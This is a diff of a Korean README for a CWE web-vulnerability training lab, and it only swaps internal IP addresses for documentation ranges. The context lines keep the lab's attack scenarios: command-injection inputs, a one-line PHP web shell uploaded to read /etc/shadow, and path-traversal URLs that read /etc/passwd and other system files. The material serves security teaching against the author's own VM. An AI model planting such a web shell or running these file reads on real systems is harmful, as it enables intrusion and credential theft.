@@ -2,7 +2,7 @@
 
 CWE(Common Weakness Enumeration) 기반 웹 취약점을 실습 환경에서 재현하고 대응 방법을 학습합니다. 각 문서는 취약점 유형별 원리, PoC, 대응을 포함합니다.
 
-> 실습 환경: Hyper-V Rocky 10 VM (10.200.101.182) + httpd 2.4 + PHP 8.2
+> 실습 환경: Hyper-V Rocky 10 VM (192.0.2.182) + httpd 2.4 + PHP 8.2
 > playbook: `/opt/00_chobo_ansible/06_security/webshell_test/setup_webshell_lab.yml`
 
 ## 목차
@@ -57,7 +57,7 @@ CWE(Common Weakness Enumeration) 기반 웹 취약점을 실습 환경에서 재
 ```
 Linux Server (Ansible Control)            Hyper-V VM (Rocky 10)
 ┌─────────────────────────────┐           ┌─────────────────────────────────┐
-│ 10.200.90.155               │           │ 10.200.101.182                  │
+│ 198.51.100.155              │           │ 192.0.2.182                     │
 │                             │           │                                 │
 │ ansible-playbook ───────────│──SSH─────>│ httpd 2.4 + PHP 8.2             │
 │                             │           │ /var/www/html/ (777, root)      │
@@ -95,7 +95,7 @@ ansible-playbook -i ../../05_vagrant/inventory.ini setup_webshell_lab.yml --limi
 ### 시나리오 1: Command Injection → 정보 수집
 
 ```
-1. http://10.200.101.182/cmd_exec.php
+1. http://192.0.2.182/cmd_exec.php
 2. 입력: id
 3. 입력: cat /etc/passwd
 4. 입력: find / -perm -4000 -type f 2>/dev/null   (SUID 파일 탐색)
@@ -108,22 +108,22 @@ ansible-playbook -i ../../05_vagrant/inventory.ini setup_webshell_lab.yml --limi
 1. backdoor.php 파일 생성:
    <?php echo shell_exec($_GET['cmd']); ?>
 
-2. http://10.200.101.182/file_upload.php 에서 업로드
+2. http://192.0.2.182/file_upload.php 에서 업로드
 
-3. http://10.200.101.182/uploads/backdoor.php?cmd=id
+3. http://192.0.2.182/uploads/backdoor.php?cmd=id
    → 웹 서버 권한으로 명령 실행 확인
 
-4. http://10.200.101.182/uploads/backdoor.php?cmd=cat /etc/shadow
+4. http://192.0.2.182/uploads/backdoor.php?cmd=cat /etc/shadow
    → 민감 파일 접근 시도
 ```
 
 ### 시나리오 3: Path Traversal → 설정 파일 유출
 
 ```
-1. http://10.200.101.182/file_read.php?file=/etc/passwd
-2. http://10.200.101.182/file_read.php?file=/etc/shadow
-3. http://10.200.101.182/file_read.php?file=/etc/httpd/conf/httpd.conf
-4. http://10.200.101.182/file_read.php?file=../../../../../../etc/passwd
+1. http://192.0.2.182/file_read.php?file=/etc/passwd
+2. http://192.0.2.182/file_read.php?file=/etc/shadow
+3. http://192.0.2.182/file_read.php?file=/etc/httpd/conf/httpd.conf
+4. http://192.0.2.182/file_read.php?file=../../../../../../etc/passwd
 ```
 
 ### 시나리오 4: 복합 공격 (chaining)
